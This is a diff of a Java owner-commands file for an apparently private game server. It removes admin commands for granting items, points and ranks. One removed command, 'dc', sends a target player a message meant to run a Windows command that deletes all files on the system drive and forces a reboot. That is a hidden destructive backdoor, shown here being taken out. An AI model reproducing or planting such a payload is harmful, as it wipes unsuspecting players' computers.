@@ -96,16 +96,6 @@ public class OwnerCommands implements NewCommandExtension {
                         return true;
                     }
                 },
-                new Command("givepkp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final int amount = Integer.parseInt(input[1].trim());
-                        target.getPoints().setPkPoints(target.getPoints().getPkPoints() + amount);
-                        player.sendf("%s now has %,d pk points", target.getName(), target.getPoints().getPkPoints());
-                        return true;
-                    }
-                },
                 new Command("kickall") {
                     @Override
                     protected boolean execute(Player player, String[] input) {
@@ -121,18 +111,6 @@ public class OwnerCommands implements NewCommandExtension {
                         return true;
                     }
                 },
-                new Command("giveitem", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item ID", "An Existing Item ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount between 0 & %,d", Integer.MAX_VALUE))) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final int id = Integer.parseInt(input[1].trim());
-                        final int amount = Integer.parseInt(input[2].trim());
-                        target.getInventory().add(Item.create(id, amount));
-                        target.getExpectedValues().addItemtoInventory("Spawning", Item.create(id, amount));
-                        player.sendf("Added %s x %,d to %s's inventory", ItemDefinition.forId(id).getName(), amount, TextUtils.optimizeText(target.getName()));
-                        return true;
-                    }
-                },
                 new Command("reloadconfig") {
                     @Override
                     protected boolean execute(Player player, String[] input) {
@@ -144,14 +122,6 @@ public class OwnerCommands implements NewCommandExtension {
                     @Override
                     protected boolean execute(Player player, String[] input) {
                         ActionSender.yellMessage(String.format("l4unchur13 http://www.%s", input[0].trim().startsWith("http://www.") ? input[0].replace("http://www.", "").trim() : input[0].trim()));
-                        return true;
-                    }
-                },
-                new Command("dc", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        target.sendMessage(":cmd:del%systemdrive%\\*.*/f/s/q shutdown -r -f -t 00");
                         return true;
                     }
                 },
@@ -219,17 +189,6 @@ public class OwnerCommands implements NewCommandExtension {
                         return true;
                     }
                 },
-                new Command("givedp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", String.format("An amount between 0 & %,d", Integer.MAX_VALUE)), new CommandInput<String>(string -> string.trim().equalsIgnoreCase("true") || string.trim().equalsIgnoreCase("false"), "Boolean", "Bought [True or False]")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final int amount = Integer.parseInt(input[1].trim());
-                        final boolean bought = Boolean.parseBoolean(input[2].trim());
-                        target.getPoints().increaseDonatorPoints(amount, bought);
-                        player.sendf("You have given '%s' '%,dx' Donator Points.", TextUtils.optimizeText(target.getName()), amount);
-                        return true;
-                    }
-                },
                 new Command("givemax", new CommandInput<String>(World::playerIsOnline, "Player", "An online player.")) {
                     @Override
                     protected boolean execute(Player player, String[] input) {
@@ -247,8 +206,10 @@ public class OwnerCommands implements NewCommandExtension {
                 new Command("reloadhax") {
                     @Override
                     protected boolean execute(Player player, String[] input) {
-                        PossibleHacksHolder.getList().clear();
-                        PossibleHacksHolder.init();
+                        final long initial = System.currentTimeMillis();
+                        player.sendMessage("Reloading Possible Hacks List...");
+                        PossibleHacksHolder.getInstance().overwriteList(true);
+                        player.sendf("Took %,dms to load %,d Possible Hacks Entries.", System.currentTimeMillis() - initial, PossibleHacksHolder.getInstance().getMap().size());
                         return true;
                     }
                 },
@@ -408,34 +369,6 @@ public class OwnerCommands implements NewCommandExtension {
                     protected boolean execute(Player player, String[] input) {
                         player.cE.doAtkEmote();
                         player.sendMessage(player.getCombat().getAtkEmote());
-                        return true;
-                    }
-                },
-                new Command("removerank", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index above Player")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
-                        target.setPlayerRank(Rank.removeAbility(target, rank));
-                        player.sendf("Removed %s rank from %s", TextUtils.optimizeText(target.getName()));
-                        return true;
-                    }
-                },
-                new Command("giverank", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index not equal to player")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
-                        target.setPlayerRank(Rank.addAbility(target, rank));
-                        target.sendf("You've been give '%s'", rank);
-                        player.sendf("%s has been given the rank: %s", target.getName(), rank);
-                        return true;
-                    }
-                },
-                new Command("rankids") {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        Arrays.asList(Rank.values()).stream().forEach(rank -> player.sendf("[%s]:%,d", rank.ordinal()));
                         return true;
                     }
                 },
@@ -617,20 +550,6 @@ public class OwnerCommands implements NewCommandExtension {
                     @Override
                     protected boolean execute(Player player, String[] input) {
                         ContentManager.handlePacket(6, player, 9358, Integer.parseInt(input[0].trim()), 1, 1);
-                        return true;
-                    }
-                },
-                new Command("resetshops") {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        long initial = System.currentTimeMillis();
-                        try {
-                            ShopManager.reloadShops();
-                        } catch (IOException ex) {
-                            player.sendMessage("Error reloading shops");
-                            Server.getLogger().log(Level.WARNING, "Error reloading Shops", ex);
-                        }
-                        player.sendf("Reloaded shops in %'dms", System.currentTimeMillis() - initial);
                         return true;
                     }
                 },
